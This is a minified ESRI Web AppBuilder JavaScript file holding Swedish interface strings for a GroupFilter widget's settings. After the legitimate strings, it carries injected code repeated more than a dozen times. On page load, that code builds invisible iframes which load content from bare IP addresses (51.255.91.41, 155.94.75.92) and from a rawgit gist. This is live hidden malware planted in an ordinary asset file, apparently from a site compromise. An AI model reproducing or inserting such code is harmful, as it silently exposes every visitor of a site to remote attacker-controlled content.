// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GroupFilter/setting/nls/strings":{configText:"Definiera dina filtergrupper nedan",labels:{groupName:"Filterupps\u00e4ttningens namn:",groupNameTip:"Namnet p\u00e5 det filter som anv\u00e4ndaren kan v\u00e4lja fr\u00e5n.",groupDesc:"Beskrivning:",groupDescTip:"Beskrivning av filterupps\u00e4ttningen.",groupOperator:"F\u00f6rinst\u00e4lld operator:",groupOperatorTip:"Alternativ f\u00f6r att f\u00f6rdefiniera filtrets operator. Om ingen f\u00f6rinst\u00e4lld operator v\u00e4ljs, anv\u00e4nder filtret operatorn Lika med.",
groupDefault:"F\u00f6rinst\u00e4llt v\u00e4rde:",groupDefaultTip:"Alternativ f\u00f6r att v\u00e4lja ett v\u00e4rde fr\u00e5n ett befintligt lager.",sameLayerAppend:"N\u00e4r ett lager visas fler \u00e4n en g\u00e5ng anv\u00e4nder du f\u00f6ljande operator mellan f\u00e4lt:",sameLayerConjunc:"Bifoga med:"},buttons:{addNewGroup:"L\u00e4gg till en ny grupp",addNewGroupTip:"L\u00e4gg till en ny filterupps\u00e4ttning.",addLayer:"L\u00e4gg till lager",addLayerTip:"L\u00e4gg till ett lager i filterupps\u00e4ttningen."},
inputs:{groupName:"Namnge din grupp",groupDesc:"Beskrivning av din grupp",groupDefault:"Ange ett f\u00f6rdefinierat v\u00e4rde",simpleMode:"B\u00f6rja i Enkel vy",simpleModeTip:"Alternativ f\u00f6r att f\u00f6renkla det konfigurerade widgetgr\u00e4nssnittet. N\u00e4r alternativet markeras f\u00f6rsvinner listrutan f\u00f6r operatorer och knapparna f\u00f6r att l\u00e4gga till kriterier.",webmapAppendMode:"Bifoga filtret i ett befintligt webbkartsfilter med ",webmapAppendModeTip:"Alternativ f\u00f6r att bifoga filtret i ett befintligt webbkartsfilter. Operatorer som st\u00f6ds \u00e4r ELLER och OCH.",
persistOnClose:"Bevara n\u00e4r widgeten st\u00e4ngts",optionsMode:"D\u00f6lj widgetalternativ",optionsModeTip:"Alternativ f\u00f6r att visa ytterligare widgetinst\u00e4llningar i gr\u00e4nssnittet. Om alternativet markeras f\u00f6rsvinner m\u00f6jligheten att spara och l\u00e4sa in definierade filter och att bevara filtret n\u00e4r widgeten st\u00e4ngs.",optionOR:"ELLER",optionAND:"OCH",optionEQUAL:"LIKA MED",optionNOTEQUAL:"INTE LIKA MED",optionGREATERTHAN:"ST\u00d6RRE \u00c4N",optionGREATERTHANEQUAL:"ST\u00d6RRE \u00c4N ELLER LIKA MED",
optionLESSTHAN:"MINDRE \u00c4N",optionLESSTHANEQUAL:"MINDRE \u00c4N ELLER LIKA MED",optionSTART:"B\u00d6RJAR MED",optionEND:"SLUTAR MED",optionLIKE:"INNEH\u00c5LLER",optionNOTLIKE:"INNEH\u00c5LLER INTE",optionONORBEFORE:"\u00c4R P\u00c5 ELLER F\u00d6RE",optionONORAFTER:"\u00c4R P\u00c5 ELLER EFTER",optionNONE:"INGEN"},tables:{layer:"Lager",layerTip:"Lagrets namn som det anges p\u00e5 kartan.",field:"F\u00e4lt",fieldTip:"F\u00e4lt som lagret ska filtreras p\u00e5.",value:"Anv\u00e4nd v\u00e4rde",valueTip:"Alternativ f\u00f6r att anv\u00e4nda listrutans v\u00e4rden fr\u00e5n lagret. Om inget lager anv\u00e4nder denna parameter, visas en vanlig textruta f\u00f6r anv\u00e4ndaren.",
zoom:"Zooma",zoomTip:"Alternativ f\u00f6r att zooma till geoobjektens utbredning efter att filtret har anv\u00e4nts. Endast ett lager kan v\u00e4ljas f\u00f6r zoomning.",action:"Ta bort",actionTip:"Ta bort lagret fr\u00e5n filterupps\u00e4ttningen."},popup:{label:"V\u00e4lj ett v\u00e4rde"},errors:{noGroups:"Minst en grupp beh\u00f6vs.",noGroupName:"Ett eller flera gruppnamn saknas.",noDuplicates:"Ett eller flera gruppnamn \u00e4r dubbletter.",noRows:"Det beh\u00f6vs minst en rad i tabellen.",noLayers:"Det finns inga lager i kartan."},
picker:{description:"Hitta ett f\u00f6rinst\u00e4llt v\u00e4rde f\u00f6r den h\u00e4r gruppen med hj\u00e4lp av det h\u00e4r formul\u00e4ret.",layer:"V\u00e4lj ett lager",layerTip:"Lagrets namn som det anges p\u00e5 webbkartan.",field:"V\u00e4lj ett f\u00e4lt",fieldTip:"F\u00e4lt som det f\u00f6rinst\u00e4llda v\u00e4rdet kommer att h\u00e4mtas fr\u00e5n.",value:"V\u00e4lj ett v\u00e4rde",valueTip:"V\u00e4rde som kommer att vara standardv\u00e4rde i widgeten."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});